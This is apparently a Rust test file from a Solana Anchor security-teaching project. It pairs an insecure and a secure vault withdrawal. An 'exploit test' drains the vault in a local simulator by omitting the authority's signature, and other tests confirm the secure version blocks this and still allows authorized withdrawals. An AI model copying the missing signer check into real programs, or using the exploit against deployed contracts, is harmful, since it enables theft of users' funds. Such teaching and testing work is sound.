use anchor_lang::{InstructionData, ToAccountMetas};
use anchor_litesvm::LiteSVM;
use signer_authorization::{
    accounts::{Initialize, InsecureWithdraw, SecureWithdraw},
    instruction::{
        Deposit, Initialize as InitializeIx, InsecureWithdraw as InsecureWithdrawIx,
        SecureWithdraw as SecureWithdrawIx,
    },
};
use solana_sdk::{
    instruction::Instruction, native_token::LAMPORTS_PER_SOL, pubkey::Pubkey, signature::Keypair,
    signer::Signer, system_program, transaction::Transaction,
};
use std::path::PathBuf;

const PROGRAM_ID: Pubkey = signer_authorization::ID;

fn read_program() -> Vec<u8> {
    let mut path = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    path.push("../target/deploy/signer_authorization.so");
    std::fs::read(&path).unwrap_or_else(|_| panic!("Failed to read program from {:?}", path))
}

fn get_vault_pda(authority: &Pubkey) -> (Pubkey, u8) {
    Pubkey::find_program_address(&[b"vault", authority.as_ref()], &PROGRAM_ID)
}

fn setup() -> (LiteSVM, Keypair) {
    let mut svm = LiteSVM::new();
    svm.add_program(PROGRAM_ID, &read_program());

    let authority = Keypair::new();
    svm.airdrop(&authority.pubkey(), 10 * LAMPORTS_PER_SOL)
        .unwrap();

    (svm, authority)
}

fn initialize_vault(svm: &mut LiteSVM, authority: &Keypair) -> Pubkey {
    let (vault, _bump) = get_vault_pda(&authority.pubkey());

    let accounts = Initialize {
        authority: authority.pubkey(),
        vault,
        system_program: system_program::ID,
    };

    let ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: accounts.to_account_metas(None),
        data: InitializeIx {}.data(),
    };

    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&authority.pubkey()),
        &[authority],
        blockhash,
    );

    svm.send_transaction(tx).unwrap();
    vault
}

fn deposit_to_vault(svm: &mut LiteSVM, authority: &Keypair, vault: &Pubkey, amount: u64) {
    let accounts = Initialize {
        authority: authority.pubkey(),
        vault: *vault,
        system_program: system_program::ID,
    };

    let ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: accounts.to_account_metas(None),
        data: Deposit { amount }.data(),
    };

    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&authority.pubkey()),
        &[authority],
        blockhash,
    );

    svm.send_transaction(tx).unwrap();
}

// ---------------------------------------------------------------------------
// EXPLOIT TEST: Missing Signer Authorization
// ---------------------------------------------------------------------------
// Demonstrates that the insecure_withdraw instruction can be called by
// anyone without the authority's signature.
// ---------------------------------------------------------------------------

#[test]
fn exploit_missing_signer_allows_unauthorized_withdrawal() {
    let (mut svm, authority) = setup();
    let vault = initialize_vault(&mut svm, &authority);

    // Deposit funds to vault
    let deposit_amount = LAMPORTS_PER_SOL;
    deposit_to_vault(&mut svm, &authority, &vault, deposit_amount);

    // Attacker setup - different keypair, NOT the authority
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), LAMPORTS_PER_SOL).unwrap();

    let attacker_destination = Keypair::new();
    svm.airdrop(&attacker_destination.pubkey(), 1000).unwrap();

    // Record balances before attack
    let vault_balance_before = svm.get_account(&vault).unwrap().lamports;
    let attacker_balance_before = svm
        .get_account(&attacker_destination.pubkey())
        .unwrap()
        .lamports;

    // EXPLOIT: Attacker calls insecure_withdraw, passing authority's pubkey
    // but NOT signing with authority's key
    let accounts = InsecureWithdraw {
        vault,
        authority: authority.pubkey(), // victim's pubkey
        destination: attacker_destination.pubkey(),
        system_program: system_program::ID,
    };

    let ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: accounts.to_account_metas(None),
        data: InsecureWithdrawIx {
            amount: deposit_amount,
        }
        .data(),
    };

    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&attacker.pubkey()),
        &[&attacker], // Only attacker signs, NOT authority
        blockhash,
    );

    // VULNERABILITY CONFIRMED: Transaction succeeds without authority signature
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "Exploit failed - but it should succeed!");

    // Verify funds were stolen
    let vault_balance_after = svm.get_account(&vault).unwrap().lamports;
    let attacker_balance_after = svm
        .get_account(&attacker_destination.pubkey())
        .unwrap()
        .lamports;

    assert!(
        vault_balance_after < vault_balance_before,
        "Vault should be drained"
    );
    assert!(
        attacker_balance_after > attacker_balance_before,
        "Attacker should receive funds"
    );
}

// ---------------------------------------------------------------------------
// SECURE TEST: Proper Signer Validation Blocks Unauthorized Withdrawal
// ---------------------------------------------------------------------------
// Demonstrates that the secure_withdraw instruction correctly rejects
// transactions where the authority hasn't signed.
// ---------------------------------------------------------------------------

#[test]
fn secure_blocks_unauthorized_withdrawal() {
    let (mut svm, authority) = setup();
    let vault = initialize_vault(&mut svm, &authority);

    // Deposit funds
    let deposit_amount = LAMPORTS_PER_SOL;
    deposit_to_vault(&mut svm, &authority, &vault, deposit_amount);

    // Attacker setup
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), LAMPORTS_PER_SOL).unwrap();

    let attacker_destination = Keypair::new();
    svm.airdrop(&attacker_destination.pubkey(), 1000).unwrap();

    // Attempt attack using secure_withdraw
    let accounts = SecureWithdraw {
        vault,
        authority: authority.pubkey(),
        destination: attacker_destination.pubkey(),
        system_program: system_program::ID,
    };

    let ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: accounts.to_account_metas(None),
        data: SecureWithdrawIx {
            amount: deposit_amount,
        }
        .data(),
    };

    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&attacker.pubkey()),
        &[&attacker], // Only attacker signs
        blockhash,
    );

    // SECURE: Transaction fails because authority didn't sign
    let result = svm.send_transaction(tx);
    assert!(
        result.is_err(),
        "Secure version should reject unsigned authority"
    );
}

// ---------------------------------------------------------------------------
// POSITIVE TEST: Authorized Withdrawal Succeeds
// ---------------------------------------------------------------------------
// Verifies that legitimate withdrawals by the authority still work.
// ---------------------------------------------------------------------------

#[test]
fn secure_allows_authorized_withdrawal() {
    let (mut svm, authority) = setup();
    let vault = initialize_vault(&mut svm, &authority);

    // Deposit funds
    let deposit_amount = LAMPORTS_PER_SOL;
    deposit_to_vault(&mut svm, &authority, &vault, deposit_amount);

    let destination = Keypair::new();
    svm.airdrop(&destination.pubkey(), 1000).unwrap();

    let destination_before = svm.get_account(&destination.pubkey()).unwrap().lamports;

    // Legitimate withdrawal by authority
    let accounts = SecureWithdraw {
        vault,
        authority: authority.pubkey(),
        destination: destination.pubkey(),
        system_program: system_program::ID,
    };

    let ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: accounts.to_account_metas(None),
        data: SecureWithdrawIx {
            amount: deposit_amount,
        }
        .data(),
    };

    let blockhash = svm.latest_blockhash();
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&authority.pubkey()),
        &[&authority], // Authority properly signs
        blockhash,
    );

    // Should succeed
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "Authorized withdrawal should succeed");

    let destination_after = svm.get_account(&destination.pubkey()).unwrap().lamports;
    assert!(
        destination_after > destination_before,
        "Destination should receive funds"
    );
}
